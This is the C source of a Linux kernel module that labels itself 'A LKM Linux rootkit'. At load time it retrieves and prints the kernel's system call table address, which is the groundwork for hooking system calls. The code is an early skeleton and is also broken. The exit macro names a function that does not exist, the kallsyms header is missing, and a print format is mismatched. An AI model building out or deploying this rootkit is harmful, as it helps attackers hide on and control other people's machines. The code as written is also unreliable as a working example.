#include <linux/init.h>
#include <linux/module.h>

#define LAZARUS_MODULE_LICENSE "GPL"
#define LAZARUS_MODULE_AUTHOR "Claudio Migliorelli <migliorelliclaudio@gmail.com>"
#define LAZARUS_MODULE_DESCRIPTION "A LKM Linux rootkit"
#define LAZARUS_MODULE_VERSION "0.1"

/* System call table address */
void **sct_address;

void sys_call_table_retrieve(void)
{
  /* Looking for the system call table address in exported symbols */
  sct_address = (void *)kallsyms_lookup_name("sys_call_table");
}

/* Load the LKM */
static int __init lzrs_t_load(void)
{
  /* retrieve the system call table address */
  sys_call_table_retrieve();
  printk("[+] LZRS - System call table retrieved: 0x%llx", sct_address);

  return 0;
}

/* Unload the LKM */
static void __exit lzrs_t_unload(void)
{

}

module_init(lzrs_t_load);
module_exit(lzrs_t_exit);

MODULE_LICENSE(LAZARUS_MODULE_LICENSE);
MODULE_AUTHOR(LAZARUS_MODULE_AUTHOR);
MODULE_DESCRIPTION(LAZARUS_MODULE_DESCRIPTION);
MODULE_VERSION(LAZARUS_MODULE_VERSION);
